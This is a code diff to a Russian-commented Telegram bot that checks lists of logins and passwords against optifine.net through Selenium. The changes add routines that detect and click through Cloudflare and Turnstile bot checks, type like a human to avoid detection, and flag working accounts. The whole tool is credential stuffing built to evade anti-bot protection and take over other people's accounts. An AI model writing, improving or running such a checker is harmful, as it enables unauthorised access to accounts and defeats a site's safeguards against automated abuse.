@@ -125,6 +125,22 @@ class OptifineChecker:
             logger.info(f"📌 Заголовок страницы: {self.driver.title}")
             logger.info(f"📌 Текущий URL: {self.driver.current_url}")
             
+            # Проверяем наличие Cloudflare
+            cloudflare_indicators = [
+                "//*[contains(text(), 'Just a moment')]",
+                "//*[contains(text(), 'security verification')]",
+                "//*[contains(text(), 'Verify you are human')]",
+                "//iframe[contains(@src, 'challenges.cloudflare.com')]",
+                "//div[contains(@class, 'cf-browser-verification')]",
+                "//input[@name='cf-turnstile-response']",
+            ]
+            
+            for indicator in cloudflare_indicators:
+                elements = self.driver.find_elements(By.XPATH, indicator)
+                if elements:
+                    logger.info(f"⚠️ Обнаружен Cloudflare: {indicator}")
+                    break
+            
             # Ищем все формы
             forms = self.driver.find_elements(By.TAG_NAME, "form")
             logger.info(f"📝 Найдено форм: {len(forms)}")
@@ -161,8 +177,69 @@ class OptifineChecker:
             logger.error(f"Ошибка при анализе страницы: {e}")
             return False
     
+    def handle_cloudflare(self, timeout=45):
+        """Обработка Cloudflare защиты"""
+        start_time = time.time()
+        
+        while time.time() - start_time < timeout:
+            current_title = self.driver.title.lower()
+            current_url = self.driver.current_url
+            
+            # Проверяем, не проскочили ли мы Cloudflare
+            if 'login' in current_url and 'just a moment' not in current_title:
+                logger.info("✅ Cloudflare пройден, на странице входа")
+                return True
+            
+            # Проверяем наличие капчи Turnstile
+            try:
+                turnstile = self.driver.find_elements(By.CSS_SELECTOR, 
+                    "[class*='turnstile'], [src*='challenges.cloudflare.com'], iframe[src*='challenges']")
+                if turnstile and any(t.is_displayed() for t in turnstile):
+                    logger.info("🔄 Обнаружена Turnstile капча, ждем автоматического решения...")
+            except:
+                pass
+            
+            # Проверяем наличие кнопки "Verify you are human"
+            try:
+                verify_buttons = self.driver.find_elements(By.XPATH, 
+                    "//*[contains(text(), 'Verify') or contains(text(), 'verify')]")
+                for btn in verify_buttons:
+                    if btn.is_displayed() and btn.is_enabled():
+                        logger.info("🖱️ Нажимаю 'Verify you are human'")
+                        try:
+                            btn.click()
+                        except:
+                            self.driver.execute_script("arguments[0].click();", btn)
+                        self.human_like_delay(2, 4)
+            except:
+                pass
+            
+            # Проверяем, не появилась ли форма входа
+            try:
+                # Ищем любой input на странице (кроме скрытых)
+                inputs = self.driver.find_elements(By.TAG_NAME, "input")
+                visible_inputs = [i for i in inputs if i.is_displayed() and 
+                                 i.get_attribute('type') not in ['hidden', 'checkbox', 'radio']]
+                
+                if visible_inputs:
+                    logger.info(f"✅ Найдены видимые поля ввода ({len(visible_inputs)}), Cloudflare пройден")
+                    return True
+            except:
+                pass
+            
+            # Ждем немного перед следующей проверкой
+            self.human_like_delay(2, 4)
+            
+            # Логируем прогресс каждые 10 секунд
+            elapsed = int(time.time() - start_time)
+            if elapsed % 10 == 0 and elapsed > 0:
+                logger.info(f"⏳ Ожидание прохождения Cloudflare... {elapsed}/{timeout} сек")
+        
+        logger.warning("⚠️ Cloudflare не пройден за отведенное время")
+        return False
+    
     async def check_account(self, login: str, password: str) -> Dict:
-        """Проверка одного аккаунта через Selenium с полным входом"""
+        """Проверка одного аккаунта через Selenium с обработкой Cloudflare"""
         
         logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
         
@@ -180,48 +257,53 @@ class OptifineChecker:
             # Переходим на страницу входа
             logger.info(f"🌐 Загружаю страницу входа...")
             self.driver.get("https://optifine.net/login")
-            self.human_like_delay(5, 8)
             
-            # Анализируем страницу
+            # Даем время на загрузку
+            self.human_like_delay(3, 5)
+            
+            # Обрабатываем Cloudflare
+            if not self.handle_cloudflare(timeout=45):
+                self.analyze_page(login[:10])
+                return {
+                    'login': login,
+                    'status': 'error',
+                    'error': 'Cloudflare не пройден'
+                }
+            
+            # Небольшая задержка после прохождения Cloudflare
+            self.human_like_delay(2, 4)
+            
+            # Анализируем страницу (уже должна быть страница входа)
             self.analyze_page(login[:10])
             
-            # Ждем загрузки страницы
+            # Ждем полной загрузки страницы входа
             try:
-                WebDriverWait(self.driver, 15).until(
-                    EC.presence_of_element_located((By.TAG_NAME, "body"))
+                WebDriverWait(self.driver, 10).until(
+                    EC.presence_of_element_located((By.TAG_NAME, "form"))
                 )
             except:
-                logger.warning("⚠️ Таймаут при загрузке страницы")
+                logger.warning("⚠️ Форма не найдена после Cloudflare")
             
-            # Расширенный поиск поля email/username
+            # Поиск поля email/username
             email_field = None
             email_selectors = [
-                "//input[@name='email']",
                 "//input[@name='username']",
-                "//input[@name='login']",
-                "//input[@name='user']",
-                "//input[@name='log']",
-                "//input[@id='email']",
+                "//input[@name='email']",
                 "//input[@id='username']",
-                "//input[@id='login']",
-                "//input[@id='user']",
-                "//input[@id='user_login']",
-                "//input[@type='email']",
+                "//input[@id='email']",
                 "//input[@type='text']",
-                "//input[contains(@class, 'email')]",
-                "//input[contains(@class, 'username')]",
-                "//input[contains(@class, 'login')]",
-                "//input[contains(@class, 'user')]",
+                "//input[@type='email']",
+                "//input[contains(@class, 'form-control')]",
                 "//input[contains(@class, 'input')]",
-                "//input[@placeholder='Email']",
                 "//input[@placeholder='Username']",
-                "//input[@placeholder='Login']",
+                "//input[@placeholder='Email']",
                 "//input[@placeholder='E-mail']",
-                "//input[@placeholder='email']",
-                "//input[@placeholder='username']",
+                "//input[@placeholder='Login']",
+                "//input[@name='log']",
+                "//input[@name='user_login']",
+                "//input[@name='user']",
                 "//input[@autocomplete='username']",
-                "//input[@autocomplete='email']",
-                "//input[@type='password']/preceding::input[1]",
+                "//input[@type='password']/preceding::input[not(@type='hidden')][1]",
             ]
             
             for selector in email_selectors:
@@ -237,13 +319,14 @@ class OptifineChecker:
                 except Exception as e:
                     continue
             
-            # Если все еще не нашли, ищем любой видимый input
+            # Если все еще не нашли, ищем любой видимый текстовый input
             if not email_field:
                 try:
                     all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
                     for inp in all_inputs:
                         input_type = inp.get_attribute('type')
-                        if input_type not in ['hidden', 'submit', 'button', 'password'] and inp.is_displayed():
+                        if (input_type not in ['hidden', 'submit', 'button', 'password', 'checkbox', 'radio'] 
+                            and inp.is_displayed()):
                             email_field = inp
                             logger.info(f"✅ Найден первый подходящий input: type={input_type}")
                             break
@@ -263,14 +346,12 @@ class OptifineChecker:
             password_selectors = [
                 "//input[@type='password']",
                 "//input[@name='password']",
-                "//input[@name='pwd']",
                 "//input[@name='pass']",
+                "//input[@name='pwd']",
                 "//input[@id='password']",
                 "//input[@id='pass']",
                 "//input[contains(@class, 'password')]",
-                "//input[contains(@class, 'pass')]",
                 "//input[@placeholder='Password']",
-                "//input[@placeholder='password']",
                 "//input[@autocomplete='current-password']",
             ]
             
@@ -307,10 +388,8 @@ class OptifineChecker:
                 "//input[@value='Login']",
                 "//input[@value='Sign in']",
                 "//input[@value='Log in']",
-                "//button[contains(@class, 'login')]",
-                "//button[contains(@class, 'submit')]",
-                "//input[contains(@class, 'login')]",
-                "//input[contains(@class, 'submit')]",
+                "//button[contains(@class, 'btn-primary')]",
+                "//button[contains(@class, 'btn')]",
                 "//*[@type='submit']",
             ]
             
@@ -335,7 +414,7 @@ class OptifineChecker:
                     'error': 'Кнопка не найдена'
                 }
             
-            # Вводим email
+            # Вводим email с человеческой задержкой
             logger.info(f"✍️ Ввожу email: {login[:20]}...")
             email_field.clear()
             for char in login:
@@ -383,22 +462,23 @@ class OptifineChecker:
             
             logger.info(f"📌 URL после входа: {current_url}")
             
-            # Критерии успеха
+            # Критерии успеха для Optifine
             success_indicators = [
-                'dashboard', 'profile', 'account', 'welcome', 
-                'logout', 'log out', 'my account', 'downloads',
-                'my profile', 'settings', 'preferences'
+                'downloads', 'my account', 'profile', 'dashboard', 
+                'welcome', 'logout', 'log out', 'premium',
+                'you are logged in', 'successfully logged'
             ]
             
             # Критерии ошибки
             error_indicators = [
                 'invalid', 'incorrect', 'wrong', 'error', 
                 'failed', 'not found', 'try again', 'does not exist',
-                'doesn\'t exist', 'not registered', 'no account'
+                'doesn\'t exist', 'not registered', 'no account',
+                'invalid username or password'
             ]
             
             # Проверяем успешность
-            if any(indicator in current_url.lower() for indicator in ['dashboard', 'profile', 'account', 'home']):
+            if any(indicator in current_url.lower() for indicator in ['downloads', 'profile', 'account', 'dashboard']):
                 logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                 return {
                     'login': login,
@@ -466,7 +546,6 @@ os.makedirs('/app/debug', exist_ok=True)
 logger.info("🚀 Создание экземпляра OptifineChecker...")
 checker = OptifineChecker()
 
-# ============= НОВАЯ КОМАНДА ДЛЯ ПОЛУЧЕНИЯ ФАЙЛОВ ОТЛАДКИ =============
 async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Отправка файлов отладки"""
     # Проверяем, является ли пользователь администратором
@@ -508,7 +587,7 @@ async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         caption=f"📁 **Debug файл:** `{file}`"
                     )
                 sent_count += 1
-                await asyncio.sleep(1)  # Небольшая задержка между отправками
+                await asyncio.sleep(1)
             except Exception as e:
                 await update.message.reply_text(f"❌ Ошибка при отправке {file}: {e}")
         
@@ -779,7 +858,7 @@ def main():
     
     # Добавляем обработчики команд
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("debug", debug_command))  # Новая команда
+    app.add_handler(CommandHandler("debug", debug_command))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
